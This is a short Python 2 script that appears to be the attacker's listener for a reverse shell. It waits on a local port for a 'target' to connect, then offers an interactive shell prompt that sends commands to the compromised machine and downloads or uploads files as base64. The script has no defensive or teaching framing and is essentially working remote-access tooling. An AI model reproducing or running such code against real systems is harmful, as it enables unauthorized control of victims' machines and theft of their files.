#!/usr/bin/python2

import base64
import socket
import json

def reliable_send(data):
        json_data = json.dumps(data)
        target.send(json_data)
def reliable_recv():
        json_data = ""
        while True:
                 try:
                         json_data = json_data + target.recv (1024)
                         return json.loads(json_data)
                 except ValueError:
                         continue
def shell():
       while True:
               command = raw_input("* Shell#-%s: " % str(ip))
               reliable_send(command)
               if command == "q":
                       break
               elif command[:8] == "download":
                   with open(command[9:], "wb") as file:
                       result = reliable_recv()
                       file.write(base64.b64decode(result))
               elif command[:6] == "upload":
                   try:
                        with open(command[7:], "rb") as fin:
                            reliable_send(base64.b64encode(fin.read()))
                   except:
                            failed ="Failed to upload"
                            reliable_send(base64.b64decode(failed))
               else:
                       result = reliable_recv()
                       print(result)

def server ():
        global s
        global ip
        global target
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("127.0.0.1",54321))
        s.listen(5)
        print("Listening for Incoming connections")
        target, ip = s.accept()
        print("Target Connected!")
server()
shell()
s.close()